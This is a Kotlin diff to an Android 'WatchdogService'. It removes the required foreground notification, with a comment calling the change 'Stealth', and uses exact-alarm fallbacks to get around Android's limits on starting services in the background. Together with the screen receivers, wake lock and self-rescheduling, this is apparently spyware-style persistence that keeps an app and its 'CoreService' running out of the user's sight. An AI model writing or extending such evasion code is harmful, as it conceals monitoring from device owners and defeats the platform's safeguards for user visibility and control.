@@ -33,11 +33,36 @@ class WatchdogService : Service() {
         const val NOTIFICATION_ID = 102
 
         fun start(context: Context) {
-            val intent = Intent(context, WatchdogService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-                context.startForegroundService(intent)
-            else
-                context.startService(intent)
+            // Stealth: plain background service — no foreground notification.
+            // Direct startService is blocked when the app is backgrounded on
+            // Android 8+; an exact alarm with a service PendingIntent carries
+            // the background-start exemption, so fall back to it.
+            try {
+                context.startService(Intent(context, WatchdogService::class.java))
+            } catch (e: Exception) {
+                Log.d(TAG, "Direct start blocked, scheduling via alarm")
+                scheduleAlarmStart(context, WatchdogService::class.java, 1000L)
+            }
+        }
+
+        // Exact alarm whose PendingIntent starts [cls] — exempt from the
+        // background-service-start restriction.
+        fun scheduleAlarmStart(context: Context, cls: Class<*>, delayMs: Long) {
+            try {
+                val pi = PendingIntent.getService(
+                    context, cls.hashCode(), Intent(context, cls),
+                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+                )
+                val am = context.getSystemService(ALARM_SERVICE) as AlarmManager
+                val triggerAt = System.currentTimeMillis() + delayMs
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi)
+                } else {
+                    am.setExact(AlarmManager.RTC_WAKEUP, triggerAt, pi)
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "scheduleAlarmStart failed", e)
+            }
         }
     }
 
@@ -63,15 +88,6 @@ class WatchdogService : Service() {
     override fun onCreate() {
         super.onCreate()
         Log.d(TAG, "Watchdog created")
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
-            nm.createNotificationChannel(
-                NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_MIN).apply {
-                    setShowBadge(false)
-                }
-            )
-        }
-        startForegroundSafely()
         registerReceiver(screenReceiver, IntentFilter().apply {
             addAction(Intent.ACTION_SCREEN_ON)
             addAction(Intent.ACTION_SCREEN_OFF)
@@ -84,29 +100,6 @@ class WatchdogService : Service() {
         startPeriodicCheck()
         scheduleAlarm()
         acquireWakeLock()
-    }
-
-    // Android 14+ (targetSdk 34) requires a foreground service type on
-    // startForeground() — without it the system throws
-    // MissingForegroundServiceTypeException and kills the process. dataSync
-    // matches the manifest foregroundServiceType; the try/catch guarantees a
-    // startForeground failure can never crash the whole process.
-    private fun startForegroundSafely() {
-        try {
-            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("System")
-                .setSmallIcon(android.R.drawable.ic_menu_info_details)
-                .setPriority(NotificationCompat.PRIORITY_MIN)
-                .setSilent(true)
-                .build()
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-            } else {
-                startForeground(NOTIFICATION_ID, notification)
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "startForeground failed", e)
-        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -160,9 +153,12 @@ class WatchdogService : Service() {
     }
 
     private fun startCoreService() {
-        val intent = Intent(this, CoreService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
-        else startService(intent)
+        try {
+            startService(Intent(this, CoreService::class.java))
+        } catch (e: Exception) {
+            Log.d(TAG, "startCoreService blocked, scheduling via alarm")
+            companion.scheduleAlarmStart(this, CoreService::class.java, 1000L)
+        }
     }
 
     // FIX: grace period — last == 0 means first boot, return true
